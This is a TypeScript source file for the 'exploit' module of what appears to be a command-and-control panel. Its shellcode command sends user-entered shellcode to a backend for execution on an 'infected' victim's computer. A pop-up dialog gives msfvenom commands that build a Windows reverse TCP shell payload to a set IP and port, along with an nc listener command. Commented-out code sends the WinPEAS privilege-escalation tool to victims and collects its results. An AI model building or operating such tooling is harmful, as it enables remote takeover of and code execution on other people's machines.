import { Command } from "@/Interfaces/Command";
import { Module } from "@/Interfaces/Module";

// const sendWinPEAS: Command = {
//     execute: async (user, args, addOutput) => {
//         try {
//             addOutput("Sending WinPEAS to user: " + user.uuid);
//             const response = await fetch("http://localhost:8000/api/modules/exploit/send_peas?id=" + user.uuid, { method: "POST" });
//             const data = await response.json();
//             addOutput("WinPEAS sent: " + data.sent);
//         } catch (error) {
//             console.error("Error sending WinPEAS:", error);
//         }
//     },
//     help: "Send WinPEAS to a victim. Usage: /exploit/winpeas"
// };

// const receiveWinPEAS: Command = {
//     execute: async (user, args, addOutput) => {
//         try {
//             addOutput("Receiving WinPEAS from user: " + user.uuid);
//             const response = await fetch("http://localhost:8000/api/modules/exploit/receive_peas?id=" + user.uuid);
//             const data = await response.json();
//             addOutput("WinPEAS received: " + data.received);
//         } catch (error) {
//             console.error("Error receiving WinPEAS:", error);
//         }
//     },
//     help: "Receive WinPEAS from a victim. Usage: /exploit/receive-peas"
// };

const useShellcode = async (shellcode: string, user: any, addOutput: CallableFunction) => {
    try {
        addOutput("Sending shellcode to user: " + user.uuid);
        const response = await fetch(`http://localhost:8000/api/modules/exploit/exec_shellcode`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                id: user.uuid,
                shellcode_x86: '',
                shellcode_x64: shellcode,
                method: '',
            }),
        });

        if (!response.ok) {
            throw new Error((await response.json()).detail);
        }

        const data = await response.json();
        addOutput(data.message);
    } catch (error) {
        console.error("Error sending shellcode:", error);
        addOutput("Failed to send shellcode: " + error);
    }
}


const shellcode: Command = {
    execute: async (user, args, addOutput) => {

        let shellcode = args["shellcode"];
        if(shellcode) {
            addOutput("Shellcode: " + shellcode);
            useShellcode(shellcode, user, addOutput);
            return;
        }

        // Create modal elements
        const modalHTML = `
            <div id="shellcode-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
                <div class="bg-white rounded-lg p-6 shadow-lg w-96">
                    <h2 class="text-lg font-bold mb-4">Enter shellcode and submit</h2>
                    
                    <label class="block mb-2">
                        <textarea id="shellcode" class="w-full border border-gray-300 p-2 rounded" rows="4" placeholder="Enter shellcode.."></textarea>
                    </label>
                    

                    <h3 class="text-md font-semibold mt-4">Example Command to Generate Shellcode:</h3>
                    <p class="text-sm text-gray-600">
                        <code>msfvenom -p windows/exec cmd=cmd.exe -f python # windows/x86/exec for 32 bit systems</code>
                    </p>
                    <h3 class="text-md font-semibold mt-2">How to Parse the Output:</h3>
                    <p class="text-sm text-gray-600">
                        Use this command to print the shellcode in one string:<br>
                        <code>msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.71 LPORT=4444 -b '\\x00\\x0A\\x0D' -f python | grep "buf +=" | cut -d'"' -f2 | tr -d ' ' | tr -d '\\n'</code>
                    </p>

                    <p class="text-sm text-gray-600 mt-2">
                        Note: If you are using a reverse shell, make sure to set up a listener on your machine.
                        <br>
                        <code>nc -lvp 4444</code>
                    </p>

                    <p class="text-sm text-gray-600 mt-2">
                        <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom" target="_blank" class="text-blue-500">Shellcode cheat sheet to test</a><br/>
                        Dont forget to change the IP and port in the shellcode, and construct it like the above command with <i>-b '\\x00\\x0A\\x0D' -f python | grep "buf +=" | cut -d'"' -f2 | tr -d ' ' | tr -d '\\n'</i> .
                    </p>

                    <div class="flex justify-end mt-4">
                        <button id="submit-btn" class="bg-blue-500 text-white px-4 py-2 rounded mr-2">Submit</button>
                        <button id="cancel-btn" class="bg-gray-300 text-gray-700 px-4 py-2 rounded">Cancel</button>
                    </div>
                </div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        document.getElementById('submit-btn')?.addEventListener('click', async () => {
            shellcode = (<HTMLTextAreaElement>document.getElementById('shellcode'))?.value;

            if (!shellcode) {
                addOutput("Shellcode information is incomplete.");
                return;
            }

            // Close modal immediately on submit
            document.getElementById('shellcode-modal')?.remove();

            useShellcode(shellcode, user, addOutput);
        });

        document.getElementById('cancel-btn')?.addEventListener('click', () => {
            document.getElementById('shellcode-modal')?.remove();
        });
    },
    help: "Execute a shellcode in the infected's computer. Usage: /exploit/shellcode :shellcode=<shellcode>\n."
};

export const exploitModule: Module = {
    commands: {
        // sendWinPEAS,
        // receiveWinPEAS,
        shellcode
    },
    help: "Module for privilege escalation"
};